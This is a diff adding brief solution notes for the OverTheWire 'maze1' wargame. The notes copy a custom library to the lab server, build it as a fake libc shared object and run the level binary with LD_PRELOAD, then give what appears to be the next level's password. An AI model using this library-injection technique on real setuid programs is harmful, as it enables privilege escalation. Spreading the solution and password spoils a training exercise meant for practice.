@@ -1,0 +1,8 @@
+scp -P 2225 ./library.c ./library.h  maze1@maze.labs.overthewire.org:/tmp
+connect to machine
+cd /tmp/
+gcc -c -fpic -m32 library.c
+gcc -shared -o libc.so.4 library.o
+LD_PRELOAD=/tmp/libc.so.4 /maze/maze1
+
+fooghihahr
